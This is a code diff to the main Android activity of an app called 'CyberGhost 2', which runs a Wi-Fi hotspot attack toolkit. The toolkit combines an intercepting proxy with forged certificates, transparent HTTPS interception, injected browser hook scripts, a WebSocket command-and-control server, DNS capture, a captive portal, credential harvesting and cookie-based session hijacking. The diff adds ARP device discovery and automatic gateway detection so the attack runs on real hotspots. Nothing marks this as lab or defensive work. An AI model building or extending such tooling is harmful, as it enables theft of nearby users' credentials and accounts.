@@ -20,7 +20,6 @@ import java.io.File
 class MainActivity : ComponentActivity() {
 
     private var certManager: CertManager? = null
-    private var deviceManager: DeviceManager? = null
     private var contentInjector: ContentInjector? = null
     private var proxy: InterceptProxy? = null
     private var c2Server: WebSocketC2Server? = null
@@ -31,6 +30,8 @@ class MainActivity : ComponentActivity() {
     private var captivePortal: CaptivePortal? = null
     private var hookJs: String = ""
 
+    // use ArpScanner instead of DeviceManager for device discovery
+    private val arpScanner = ArpScanner()
     private val trafficStats = TrafficStats()
     private val networkMapper = NetworkMapper()
     private val certViewer = SslCertViewer()
@@ -40,6 +41,9 @@ class MainActivity : ComponentActivity() {
     private lateinit var profileManager: ProfileManager
     private lateinit var packetExporter: PacketExporter
     private lateinit var sessionSave: SessionSave
+
+    // DeviceManager still needed for hook session tracking
+    private val deviceManager = DeviceManager()
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -55,9 +59,15 @@ class MainActivity : ComponentActivity() {
 
         setContent {
             CyberGhostTheme {
+                // detect real hotspot IP on composition
+                val gatewayIp = remember { HotspotManager.getHotspotIp(this@MainActivity) }
+                val subnet = remember { HotspotManager.getSubnet(gatewayIp) }
+
+                Log.i("CG2", "Gateway IP: $gatewayIp, Subnet: $subnet")
+
                 val packets = remember { mutableStateListOf<InterceptedPacket>() }
                 val interceptQueue = remember { mutableStateListOf<PendingIntercept>() }
-                val devices = remember { mutableStateListOf<ConnectedDevice>() }
+                val arpDevices by arpScanner.devices.collectAsState()
                 val events = remember { mutableStateListOf<C2Event>() }
                 val credentials = remember { mutableStateListOf<HarvestedCredential>() }
                 val captiveEntries = remember { mutableStateListOf<CaptiveEntry>() }
@@ -76,20 +86,32 @@ class MainActivity : ComponentActivity() {
                 val prefs = getSharedPreferences("cg2_prefs", Context.MODE_PRIVATE)
                 var autoStart by remember { mutableStateOf(prefs.getBoolean("auto_start", false)) }
 
+                // start ARP scanner immediately regardless of capture state
+                LaunchedEffect(Unit) {
+                    arpScanner.start(subnet)
+                }
+
                 LaunchedEffect(isRunning) {
                     if (isRunning) {
                         try {
                             if (certManager == null) certManager = CertManager(filesDir)
-                            if (deviceManager == null) deviceManager = DeviceManager()
-                            if (contentInjector == null) contentInjector = ContentInjector()
+                            if (contentInjector == null) contentInjector = ContentInjector(
+                                mediaServerHost = gatewayIp
+                            )
                             contentInjector?.config = config
 
                             proxy = InterceptProxy(8080, certManager!!, contentInjector!!).also { p ->
                                 p.mode = mode; p.start()
                                 launch {
                                     p.packets.collect { pkt ->
-                                        packets.add(pkt); if (packets.size > 2000) packets.removeAt(0)
-                                        deviceManager?.trackRequest(pkt.sourceIp, pkt.headers["User-Agent"], pkt.body.size.toLong())
+                                        packets.add(pkt)
+                                        if (packets.size > 2000) packets.removeAt(0)
+                                        // update ARP scanner with traffic data
+                                        arpScanner.updateTraffic(
+                                            pkt.sourceIp,
+                                            pkt.headers["User-Agent"],
+                                            pkt.body.size.toLong()
+                                        )
                                         trafficStats.recordPacket(pkt)
                                         if (pkt.isRequest) contentInjector?.harvester?.inspect(pkt)
                                     }
@@ -97,7 +119,6 @@ class MainActivity : ComponentActivity() {
                                 launch {
                                     contentInjector?.harvester?.credentials?.collect { cred ->
                                         credentials.add(cred)
-                                        // auto-add cookie sessions to hijacker
                                         if (cred.type == CredentialType.COOKIE_SESSION) {
                                             sessionHijacker.addFromCredential(cred)
                                         }
@@ -109,12 +130,27 @@ class MainActivity : ComponentActivity() {
                             transparentHttps = TransparentHttpsServer(443, proxy!!, certManager!!, contentInjector!!).also { it.start() }
                             mediaServer = MediaServer(9090, this@MainActivity, hookJs).also { it.start() }
 
-                            c2Server = WebSocketC2Server(9091, deviceManager!!).also { c2 ->
+                            c2Server = WebSocketC2Server(9091, deviceManager).also { c2 ->
                                 c2.start()
-                                launch { c2.events.collect { event -> events.add(event); if (events.size > 500) events.removeAt(0) } }
+                                launch {
+                                    c2.events.collect { event ->
+                                        events.add(event)
+                                        if (events.size > 500) events.removeAt(0)
+                                        // mark device as hooked in ARP scanner
+                                        if (event.type == "registered") {
+                                            val ip = event.data["ip"] as? String ?: ""
+                                            arpScanner.markHooked(ip, event.sessionId)
+                                        }
+                                    }
+                                }
                             }
 
-                            dnsCapture = DnsCapture(5353, gatewayIp = "192.168.43.1", transparentMode = true).also { dns ->
+                            // DNS on port 53 with dynamic gateway IP
+                            dnsCapture = DnsCapture(
+                                listenPort = 53,
+                                gatewayIp = gatewayIp,
+                                transparentMode = true
+                            ).also { dns ->
                                 dns.start()
                                 launch { dns.queries.collect { trafficStats.recordDns() } }
                             }
@@ -128,22 +164,24 @@ class MainActivity : ComponentActivity() {
                             launch {
                                 while (true) {
                                     kotlinx.coroutines.delay(500)
-                                    deviceManager?.let { dm ->
-                                        devices.clear(); devices.addAll(dm.getAllDevices())
-                                        hookedSessions = dm.getHookedSessions()
-                                    }
-                                    updateNotification(devices.size, hookedSessions.count { it.isAlive }, trafficStats.totalPackets.get(), credentials.size)
+                                    hookedSessions = deviceManager.getHookedSessions()
+                                    updateNotification(
+                                        arpDevices.size,
+                                        hookedSessions.count { it.isAlive },
+                                        trafficStats.totalPackets.get(),
+                                        credentials.size
+                                    )
                                 }
                             }
 
-                            showNotification("Engines started")
-                            Log.i("CG2", "All engines started")
+                            showNotification("Engines started — gateway $gatewayIp")
+                            Log.i("CG2", "All engines started on $gatewayIp")
                         } catch (e: Exception) {
-                            Log.e("CG2", "Start failed", e); isRunning = false
+                            Log.e("CG2", "Start failed", e)
+                            isRunning = false
                         }
                     } else {
-                        stopAll()
-                        cancelNotification()
+                        stopAll(); cancelNotification()
                     }
                 }
 
@@ -163,16 +201,47 @@ class MainActivity : ComponentActivity() {
                     }
                 }
 
+                // convert ArpDevices to ConnectedDevice for UI compatibility
+                val connectedDevices = remember(arpDevices) {
+                    arpDevices.map { arp ->
+                        ConnectedDevice(
+                            ip = arp.ip,
+                            mac = arp.mac,
+                            hostname = arp.nickname ?: arp.hostname,
+                            userAgent = arp.userAgent,
+                            requestCount = arp.requestCount,
+                            bytesTransferred = arp.bytesTransferred
+                        ).also { cd ->
+                            // copy hooked sessions from device manager
+                            val dm = deviceManager.getDevice(arp.ip)
+                            dm?.hookedSessions?.let { cd.hookedSessions.addAll(it) }
+                        }
+                    }
+                }
+
                 CyberGhostApp(
-                    interceptQueue = interceptQueue, packets = packets, devices = devices,
-                    hookedSessions = hookedSessions, mode = mode, isRunning = isRunning,
-                    events = events, networkHosts = networkHosts, isScanning = isScanning,
-                    trafficStats = trafficStats, profiles = profiles, certInfos = certInfos,
-                    credentials = credentials, currentConfig = config,
-                    hijackSessions = hijackSessions, captiveEntries = captiveEntries,
-                    captiveConfig = captiveConfig, wsFrames = wsFrames,
-                    savedSessions = savedSessions, autoStartEnabled = autoStart,
-                    onModeChange = { mode = it }, onToggle = { isRunning = !isRunning },
+                    interceptQueue = interceptQueue,
+                    packets = packets,
+                    devices = connectedDevices,
+                    hookedSessions = hookedSessions,
+                    mode = mode,
+                    isRunning = isRunning,
+                    events = events,
+                    networkHosts = networkHosts,
+                    isScanning = isScanning,
+                    trafficStats = trafficStats,
+                    profiles = profiles,
+                    certInfos = certInfos,
+                    credentials = credentials,
+                    currentConfig = config,
+                    hijackSessions = hijackSessions,
+                    captiveEntries = captiveEntries,
+                    captiveConfig = captiveConfig,
+                    wsFrames = wsFrames,
+                    savedSessions = savedSessions,
+                    autoStartEnabled = autoStart,
+                    onModeChange = { mode = it },
+                    onToggle = { isRunning = !isRunning },
                     onForward = { id, pkt -> proxy?.forwardPacket(id, pkt) },
                     onDrop = { id -> proxy?.dropPacket(id) },
                     onCommand = { session, action, params ->
@@ -193,11 +262,11 @@ class MainActivity : ComponentActivity() {
                     onExportCa = { exportCa() },
                     onExportHar = { val f = packetExporter.exportHar(packets.toList()); f?.let { packetExporter.shareFile(it) } },
                     onConfigUpdate = { config = it },
-                    onScanNetwork = { networkMapper.scan() },
+                    onScanNetwork = { networkMapper.scan(subnet) },
                     onSaveProfile = { name -> profileManager.save(name, config); profiles = profileManager.list() },
                     onLoadProfile = { name -> profileManager.load(name)?.let { config = it } },
                     onDeleteProfile = { name -> profileManager.delete(name); profiles = profileManager.list() },
-                    onSetNickname = { ip, name -> deviceManager?.getDevice(ip)?.hostname = name },
+                    onSetNickname = { ip, name -> arpScanner.setNickname(ip, name) },
                     onInspectCert = { host ->
                         kotlinx.coroutines.MainScope().launch {
                             certViewer.inspect(host)?.let { certInfoCache[host] = it; certInfos = certInfoCache.toMap() }
@@ -212,10 +281,7 @@ class MainActivity : ComponentActivity() {
                         savedSessions = sessionSave.list()
                     },
                     onDeleteSession = { name -> sessionSave.delete(name); savedSessions = sessionSave.list() },
-                    onShareSession = { name ->
-                        val f = sessionSave.getFile(name)
-                        f?.let { packetExporter.shareFile(it) }
-                    },
+                    onShareSession = { name -> sessionSave.getFile(name)?.let { packetExporter.shareFile(it) } },
                     onToggleAutoStart = { enabled ->
                         autoStart = enabled
                         prefs.edit().putBoolean("auto_start", enabled).apply()
@@ -227,13 +293,10 @@ class MainActivity : ComponentActivity() {
 
     private fun openHijackSession(session: HijackSession) {
         try {
-            val url = "https://${session.host}"
-            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
+            val intent = Intent(Intent.ACTION_VIEW, Uri.parse("https://${session.host}"))
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             startActivity(intent)
-        } catch (e: Exception) {
-            Log.e("CG2", "Hijack open failed", e)
-        }
+        } catch (e: Exception) { Log.e("CG2", "Hijack open failed", e) }
     }
 
     private fun exportCa() {
@@ -248,25 +311,29 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun stopAll() {
-        proxy?.stop(); proxy = null; transparentHttp?.stop(); transparentHttp = null
-        transparentHttps?.stop(); transparentHttps = null; c2Server?.stop(); c2Server = null
-        mediaServer?.stop(); mediaServer = null; dnsCapture?.stop(); dnsCapture = null
+        proxy?.stop(); proxy = null
+        transparentHttp?.stop(); transparentHttp = null
+        transparentHttps?.stop(); transparentHttps = null
+        c2Server?.stop(); c2Server = null
+        mediaServer?.stop(); mediaServer = null
+        dnsCapture?.stop(); dnsCapture = null
         captivePortal?.stop(); captivePortal = null
     }
 
     private fun createNotificationChannel() {
-        val channel = NotificationChannel("cg2_status", "CyberGhost Status", NotificationManager.IMPORTANCE_LOW).apply { setShowBadge(false) }
-        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
+        val ch = NotificationChannel("cg2_status", "CyberGhost Status", NotificationManager.IMPORTANCE_LOW).apply { setShowBadge(false) }
+        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
     }
 
     private fun showNotification(text: String) {
-        val n = NotificationCompat.Builder(this, "cg2_status").setContentTitle("CyberGhost 2").setContentText(text)
+        val n = NotificationCompat.Builder(this, "cg2_status")
+            .setContentTitle("CyberGhost 2").setContentText(text)
             .setSmallIcon(android.R.drawable.ic_menu_manage).setOngoing(true).build()
         getSystemService(NotificationManager::class.java).notify(1337, n)
     }
 
     private fun updateNotification(devices: Int, hooked: Int, packets: Long, creds: Int) {
-        showNotification("D:$devices H:$hooked P:$packets C:$creds")
+        showNotification("D:$devices  H:$hooked  P:$packets  C:$creds")
     }
 
     private fun cancelNotification() {
@@ -274,6 +341,6 @@ class MainActivity : ComponentActivity() {
     }
 
     override fun onDestroy() {
-        stopAll(); cancelNotification(); super.onDestroy()
+        arpScanner.stop(); stopAll(); cancelNotification(); super.onDestroy()
     }
 }
